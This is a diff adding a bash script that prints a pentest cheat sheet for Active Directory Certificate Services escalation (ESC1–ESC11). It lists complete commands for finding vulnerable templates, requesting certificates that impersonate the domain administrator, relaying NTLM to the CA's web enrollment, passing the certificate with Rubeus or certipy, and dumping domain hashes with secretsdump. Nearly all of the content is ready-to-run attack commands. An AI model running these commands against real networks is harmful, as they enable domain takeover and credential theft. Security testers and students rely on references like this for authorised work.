@@ -1,0 +1,60 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── ADCS — ESC ATTACKS ───────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ESC Quick Reference ──────────────────────────────${NC}"
+echo -e "  ${GREEN}ESC1${NC}    # Enrollee supplies SAN + low-priv enrollment + auth EKU -> cert as any user"
+echo -e "  ${GREEN}ESC2${NC}    # Any-purpose EKU (same exploit path as ESC3)"
+echo -e "  ${GREEN}ESC3${NC}    # Certificate Agent EKU -> request cert on behalf of DA"
+echo -e "  ${GREEN}ESC4${NC}    # Write access to template object -> modify to ESC1 conditions"
+echo -e "  ${GREEN}ESC6${NC}    # CA EDITF_ATTRIBUTESUBJECTALTNAME2 flag -> any template -> ESC1"
+echo -e "  ${GREEN}ESC7${NC}    # ManageCA right -> enable ESC6 or approve pending certs"
+echo -e "  ${GREEN}ESC8${NC}    # NTLM relay to HTTP certsrv -> get DC cert -> DCSync"
+echo -e "  ${GREEN}ESC9${NC}    # No security extension + UPN change -> impersonate any user"
+echo -e "  ${GREEN}ESC11${NC}   # Relay to ADCS RPC (ICPR) without encryption"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumeration ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}certipy-ad find -u 'user@corp.com' -p 'pass' -dc-ip <DC_IP> -enabled -vulnerable -stdout${NC}"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> -M adcs${NC}"
+echo -e "  ${GREEN}Certify.exe find /vulnerable${NC}         # on Windows target"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ESC1 — Misconfigured Template (Linux) ────────────${NC}"
+echo -e "  Note: Conditions: low-priv enrollment + no manager approval + ENROLLEE_SUPPLIES_SUBJECT + auth EKU"
+printf "\n"
+echo -e "  ${GREEN}certipy-ad req -u 'user@corp.com' -p 'pass' -target ca01.corp.com -ca 'corp-CA01-CA' -template VulnTemplate -upn 'administrator@corp.com'${NC}"
+echo -e "  ${GREEN}certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>${NC}  # outputs administrator.ccache + NT hash"
+echo -e "  ${GREEN}impacket-secretsdump 'corp.com/administrator@<DC_IP>' -hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ESC1 — Windows Path (Certify + Rubeus) ───────────${NC}"
+echo -e "  ${GREEN}Certify.exe request /ca:ca01.corp.com\\corp-CA01-CA /template:VulnTemplate /altname:Administrator${NC}"
+echo -e "  Note: Save PEM then convert to PFX:"
+echo -e "  ${GREEN}openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx${NC}"
+echo -e "  ${GREEN}Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:lab /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ESC8 — NTLM Relay to ADCS HTTP ──────────────────${NC}"
+echo -e "  ${GREEN}impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support${NC}"
+echo -e "  ${GREEN}coercer coerce --target-ip <DC_IP> --l <KALI_IP> -u user -p pass --filter-method-name EfsRpcAddUsersToFile${NC}"
+echo -e "  Note: saves DC\$.pfx"
+echo -e "  ${GREEN}certipy-ad auth -pfx DC08\$.pfx -dc-ip <DC_IP>${NC}"
+echo -e "  ${GREEN}impacket-secretsdump 'corp.com/dc\$@<DC_IP>' -hashes 'aad3..:<NT_HASH>'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Pass-the-Certificate (PKINIT) ────────────────────${NC}"
+echo -e "  ${GREEN}certipy-ad auth -pfx certificate.pfx -dc-ip <DC_IP>${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
